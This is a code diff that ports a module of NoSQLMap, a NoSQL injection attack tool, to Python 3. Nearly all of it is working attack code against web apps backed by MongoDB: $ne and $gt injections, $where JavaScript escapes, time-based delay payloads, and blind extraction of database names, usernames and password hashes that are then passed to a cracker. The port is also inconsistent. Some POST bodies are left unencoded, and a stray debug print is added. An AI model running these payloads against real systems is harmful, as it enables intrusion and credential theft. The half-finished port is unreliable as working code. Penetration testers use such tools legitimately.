@@ -1,14 +1,14 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 # NoSQLMap Copyright 2012-2017 NoSQLMap Development team
 # See the file 'doc/COPYING' for copying permission
 
 
-from exception import NoSQLMapException
-import six.moves.urllib.request, six.moves.urllib.parse, six.moves.urllib.error
-import six.moves.urllib.request, six.moves.urllib.error, six.moves.urllib.parse
+from .exceptions import NoSQLMapException
+import urllib.request
+import urllib.parse
+import urllib.error
 import string
-import nsmmongo
-from sys import version_info
+from . import mongodb
 import datetime
 import time
 import random
@@ -113,11 +113,11 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
             + str(uri).strip()
         )
     try:
-        req = six.moves.urllib.request.Request(appURL, None, requestHeaders)
-        appRespCode = six.moves.urllib.request.urlopen(req).getcode()
+        req = urllib.request.Request(appURL, None, requestHeaders)
+        appRespCode = urllib.request.urlopen(req).getcode()
         if appRespCode == 200:
             normLength = int(len(getResponseBodyHandlingErrors(req)))
-            timeReq = six.moves.urllib.request.urlopen(req)
+            timeReq = urllib.request.urlopen(req)
             start = time.time()
             page = timeReq.read()
             end = time.time()
@@ -172,7 +172,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
 
         randomUri = buildUri(appURL, injectString, args)
         print("URI : " + randomUri)
-        req = six.moves.urllib.request.Request(randomUri, None, requestHeaders)
+        req = urllib.request.Request(randomUri, None, requestHeaders)
 
         if verb == "ON":
             print(
@@ -204,7 +204,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
             print("Test 1: PHP/ExpressJS != associative array injection")
 
         # Test for errors returned by injection
-        req = six.moves.urllib.request.Request(uriArray[1], None, requestHeaders)
+        req = urllib.request.Request(uriArray[1], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
 
         if errorCheck == False:
@@ -224,7 +224,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
             print("Test 2: $where injection (string escape)")
 
         print(uriArray[2])
-        req = six.moves.urllib.request.Request(uriArray[2], None, requestHeaders)
+        req = urllib.request.Request(uriArray[2], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
 
         if errorCheck == False:
@@ -244,7 +244,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
         else:
             print("Test 3:  $where injection (integer escape)")
 
-        req = six.moves.urllib.request.Request(uriArray[3], None, requestHeaders)
+        req = urllib.request.Request(uriArray[3], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
 
         if errorCheck == False:
@@ -265,7 +265,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
         else:
             print("Test 4: $where injection string escape (single record)")
 
-        req = six.moves.urllib.request.Request(uriArray[4], None, requestHeaders)
+        req = urllib.request.Request(uriArray[4], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
 
         if errorCheck == False:
@@ -284,7 +284,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
         else:
             print("Test 5: $where injection integer escape (single record)")
 
-        req = six.moves.urllib.request.Request(uriArray[5], None, requestHeaders)
+        req = urllib.request.Request(uriArray[5], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
 
         if errorCheck == False:
@@ -304,7 +304,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
         else:
             print("Test 6: This != injection (string escape)")
 
-        req = six.moves.urllib.request.Request(uriArray[6], None, requestHeaders)
+        req = urllib.request.Request(uriArray[6], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
 
         if errorCheck == False:
@@ -323,7 +323,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
         else:
             print("Test 7: This != injection (integer escape)")
 
-        req = six.moves.urllib.request.Request(uriArray[7], None, requestHeaders)
+        req = urllib.request.Request(uriArray[7], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
 
         if errorCheck == False:
@@ -341,7 +341,7 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
         else:
             print("Test 8: PHP/ExpressJS > Undefined Injection")
 
-        req = six.moves.urllib.request.Request(uriArray[8], None, requestHeaders)
+        req = urllib.request.Request(uriArray[8], None, requestHeaders)
         errorCheck = errorTest(getResponseBodyHandlingErrors(req), testNum)
 
         if errorCheck == False:
@@ -352,18 +352,17 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
         if args == None:
             doTimeAttack = input("Start timing based tests (y/n)? ")
         else:
-            doTimeAttack = args.doTimeAttack
+            # ``--doTimeAttack`` is optional; default to "n" (no timing tests)
+            # when it is not supplied, matching the behaviour of ``postApps``.
+            doTimeAttack = args.doTimeAttack or "n"
 
         if doTimeAttack.lower() == "y":
             print("Starting Javascript string escape time based injection...")
-            req = six.moves.urllib.request.Request(uriArray[18], None, requestHeaders)
+            req = urllib.request.Request(uriArray[18], None, requestHeaders)
             start = time.time()
             page = getResponseBodyHandlingErrors(req)
             end = time.time()
-            # print str(end)
-            # print str(start)
             strTimeDelta = int(round((end - start), 3)) - timeBase
-            # print str(strTimeDelta)
             if strTimeDelta > 25:
                 print(
                     "HTTP load time variance was "
@@ -381,14 +380,11 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
                 strTbAttack = False
 
             print("Starting Javascript integer escape time based injection...")
-            req = six.moves.urllib.request.Request(uriArray[9], None, requestHeaders)
+            req = urllib.request.Request(uriArray[9], None, requestHeaders)
             start = time.time()
             page = getResponseBodyHandlingErrors(req)
             end = time.time()
-            # print str(end)
-            # print str(start)
             intTimeDelta = int(round((end - start), 3)) - timeBase
-            # print str(strTimeDelta)
             if intTimeDelta > 25:
                 print(
                     "HTTP load time variance was "
@@ -450,11 +446,16 @@ def getApps(webPort, victim, uri, https, verb, requestHeaders, args=None):
 
 def getResponseBodyHandlingErrors(req):
     try:
-        responseBody = six.moves.urllib.request.urlopen(req).read()
-    except six.moves.urllib.error.HTTPError as err:
+        print(req)
+        responseBody = urllib.request.urlopen(req).read()
+    except urllib.error.HTTPError as err:
         responseBody = err.read()
 
-    return responseBody
+    # Decode to ``str`` so callers can use ``str.find`` (the tool's error
+    # detection does ``errorCheck.find("ReferenceError")``); ``bytes.find``
+    # with a ``str`` argument raises ``TypeError`` on Python 3. ``errors=
+    # "replace"`` guards against non-UTF-8 error pages.
+    return responseBody.decode("utf-8", errors="replace")
 
 
 def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=None):
@@ -496,14 +497,14 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
         appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
 
     try:
-        body = six.moves.urllib.parse.urlencode(postData)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
-        appRespCode = six.moves.urllib.request.urlopen(req).getcode()
+        body = urllib.parse.urlencode(postData).encode("utf-8")
+        req = urllib.request.Request(appURL, body, requestHeaders)
+        appRespCode = urllib.request.urlopen(req).getcode()
 
         if appRespCode == 200:
 
             normLength = int(len(getResponseBodyHandlingErrors(req)))
-            timeReq = six.moves.urllib.request.urlopen(req)
+            timeReq = urllib.request.urlopen(req)
             start = time.time()
             page = timeReq.read()
             end = time.time()
@@ -582,8 +583,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
         else:
             print("Sending random parameter value...")
 
-        body = six.moves.urllib.parse.urlencode(postData)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(postData).encode("utf-8")
+        req = urllib.request.Request(appURL, body, requestHeaders)
         randLength = int(len(getResponseBodyHandlingErrors(req)))
         print("Got response length of " + str(randLength) + ".")
 
@@ -598,8 +599,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
         neDict = postData
         neDict[injOpt + "[$ne]"] = neDict[injOpt]
         del neDict[injOpt]
-        body = six.moves.urllib.parse.urlencode(neDict)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(neDict)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print(
                 "Testing Mongo PHP not equals associative array injection using "
@@ -629,8 +630,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
         gtDict.update({injOpt: ""})
         gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
         del gtDict[injOpt]
-        body = six.moves.urllib.parse.urlencode(gtDict)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(gtDict)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print(
                 "Testing PHP/ExpressJS >Undefined Injection using "
@@ -649,8 +650,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
             testNum += 1
 
         postData.update({injOpt: "a'; return db.a.find(); var dummy='!"})
-        body = six.moves.urllib.parse.urlencode(postData)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(postData)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print(
                 "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
@@ -672,8 +673,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
         print("\n")
 
         postData.update({injOpt: "1; return db.a.find(); var dummy=1"})
-        body = six.moves.urllib.parse.urlencode(postData)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(postData)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print(
                 "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
@@ -694,8 +695,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
 
         # Start a single record attack in case the app expects only one record back
         postData.update({injOpt: "a'; return db.a.findOne(); var dummy='!"})
-        body = six.moves.urllib.parse.urlencode(postData)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(postData)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print(
                 "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
@@ -717,8 +718,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
         print("\n")
 
         postData.update({injOpt: "1; return db.a.findOne(); var dummy=1"})
-        body = six.moves.urllib.parse.urlencode(postData)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(postData)
+        req = urllib.request.Request(appURL, body, requestHeaders)
         if verb == "ON":
             print(
                 "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
@@ -742,8 +743,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
         postData.update(
             {injOpt: "a'; return this.a != '" + injectString + "'; var dummy='!"}
         )
-        body = six.moves.urllib.parse.urlencode(postData)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(postData)
+        req = urllib.request.Request(appURL, body, requestHeaders)
 
         if verb == "ON":
             print(
@@ -767,8 +768,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
         postData.update(
             {injOpt: "1; return this.a != '" + injectString + "'; var dummy=1"}
         )
-        body = six.moves.urllib.parse.urlencode(postData)
-        req = six.moves.urllib.request.Request(appURL, body, requestHeaders)
+        body = urllib.parse.urlencode(postData)
+        req = urllib.request.Request(appURL, body, requestHeaders)
 
         if verb == "ON":
             print(
@@ -800,8 +801,8 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
                     injOpt: "a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"
                 }
             )
-            body = six.moves.urllib.parse.urlencode(postData)
-            conn = six.moves.urllib.request.urlopen(req, body)
+            body = urllib.parse.urlencode(postData)
+            conn = urllib.request.urlopen(req, body)
             start = time.time()
             page = conn.read()
             end = time.time()
@@ -809,7 +810,6 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
             print(str(end))
             print(str(start))
             strTimeDelta = int(round((end - start), 3)) - timeBase
-            # print str(strTimeDelta)
             if strTimeDelta > 25:
                 print(
                     "HTTP load time variance was "
@@ -833,16 +833,15 @@ def postApps(victim, webPort, uri, https, verb, postData, requestHeaders, args=N
                     injOpt: "1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"
                 }
             )
-            body = six.moves.urllib.parse.urlencode(postData)
+            body = urllib.parse.urlencode(postData)
             start = time.time()
-            conn = six.moves.urllib.request.urlopen(req, body)
+            conn = urllib.request.urlopen(req, body)
             page = conn.read()
             end = time.time()
             conn.close()
             print(str(end))
             print(str(start))
             intTimeDelta = (end - start) - timeBase
-            # print str(strTimeDelta)
             if intTimeDelta > 25:
                 print(
                     "HTTP load time variance was "
@@ -1110,8 +1109,6 @@ def buildUri(origUri, randValue, args=None):
         for params in injIndex.split(","):
             injOpt.append(paramName[int(params) - 1])
 
-        # injOpt = str(paramName[int(injIndex)-1])
-
         for params in injOpt:
             print("Injecting the " + params + " parameter...")
 
@@ -1206,9 +1203,8 @@ def buildUri(origUri, randValue, args=None):
     # Clip the extra & off the end of the URL
     x = 0
     while x <= 18:
-        #        uriArray[x]= uriArray[x][:-1]
         uriArray[x] = (
-            split_uri[0] + "?" + six.moves.urllib.parse.quote_plus(uriArray[x][:-1])
+            split_uri[0] + "?" + urllib.parse.quote_plus(uriArray[x][:-1])
         )
 
         x += 1
@@ -1238,8 +1234,7 @@ def getDBInfo():
     chars = string.ascii_letters + string.digits
     print("Getting baseline True query return size...")
     trueUri = uriArray[16].replace("---", "return true; var dummy ='!" + "&")
-    # print "Debug " + str(trueUri)
-    req = six.moves.urllib.request.Request(trueUri, None, requestHeaders)
+    req = urllib.request.Request(trueUri, None, requestHeaders)
     baseLen = int(len(getResponseBodyHandlingErrors(req)))
     print("Got baseline true query length of " + str(baseLen))
 
@@ -1253,10 +1248,8 @@ def getDBInfo():
             + ") {return true;} var dum='a"
             + "&",
         )
-        # print "Debug: " + calcUri
-        req = six.moves.urllib.request.Request(calcUri, None, requestHeaders)
+        req = urllib.request.Request(calcUri, None, requestHeaders)
         lenUri = int(len(getResponseBodyHandlingErrors(req)))
-        # print "Debug length: " + str(lenUri)
 
         if lenUri == baseLen:
             print("Got database name length of " + str(curLen) + " characters.")
@@ -1277,7 +1270,7 @@ def getDBInfo():
             + "&",
         )
 
-        req = six.moves.urllib.request.Request(charUri, None, requestHeaders)
+        req = urllib.request.Request(charUri, None, requestHeaders)
         lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
         if lenUri == baseLen:
@@ -1307,7 +1300,7 @@ def getDBInfo():
                 + ") { return true; } var dum='a",
             )
 
-            req = six.moves.urllib.request.Request(usrCntUri, None, requestHeaders)
+            req = urllib.request.Request(usrCntUri, None, requestHeaders)
             lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
             if lenUri == baseLen:
@@ -1339,7 +1332,7 @@ def getDBInfo():
                         + "&",
                     )
 
-                    req = six.moves.urllib.request.Request(usrUri, None, requestHeaders)
+                    req = urllib.request.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
@@ -1360,12 +1353,11 @@ def getDBInfo():
                         + "&",
                     )
 
-                    req = six.moves.urllib.request.Request(usrUri, None, requestHeaders)
+                    req = urllib.request.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         username = username + chars[charCounterUsr]
-                        # print username
                         rightCharsUsr += 1
                         charCounterUsr = 0
 
@@ -1375,8 +1367,6 @@ def getDBInfo():
                 retrUsers += 1
                 users.append(username)
                 # reinitialize all variables and get ready to do it again
-                # print str(retrUsers)
-                # print str(users)
                 charCountUsr = False
                 rightCharsUsr = 0
                 usrChars = 0
@@ -1393,14 +1383,13 @@ def getDBInfo():
                         + "&",
                     )
 
-                    req = six.moves.urllib.request.Request(
+                    req = urllib.request.Request(
                         hashUri, None, requestHeaders
                     )
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         pwdHash = pwdHash + chars[charCounterHash]
-                        # print pwdHash
                         rightCharsHash += 1
                         charCounterHash = 0
 
@@ -1426,7 +1415,7 @@ def getDBInfo():
                         + "&",
                     )
 
-                    req = six.moves.urllib.request.Request(usrUri, None, requestHeaders)
+                    req = urllib.request.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
@@ -1449,12 +1438,11 @@ def getDBInfo():
                         + "&",
                     )
 
-                    req = six.moves.urllib.request.Request(usrUri, None, requestHeaders)
+                    req = urllib.request.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
 
                     if lenUri == baseLen:
                         username = username + chars[charCounterUsr]
-                        # print username
                         rightCharsUsr += 1
                         charCounterUsr = 0
 
@@ -1481,7 +1469,7 @@ def getDBInfo():
                         + "&",
                     )
 
-                    req = six.moves.urllib.request.Request(
+                    req = urllib.request.Request(
                         hashUri, None, requestHeaders
                     )
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1516,7 +1504,7 @@ def getDBInfo():
             menuItem += 1
 
         userIndex = input("Select user hash to crack: ")
-        nsmmongo.passCrack(users[int(userIndex) - 1], hashes[int(userIndex) - 1])
+        mongodb.passCrack(users[int(userIndex) - 1], hashes[int(userIndex) - 1])
 
         crackHash = input("Crack another hash (y/n)?")
     input("Press enter to continue...")
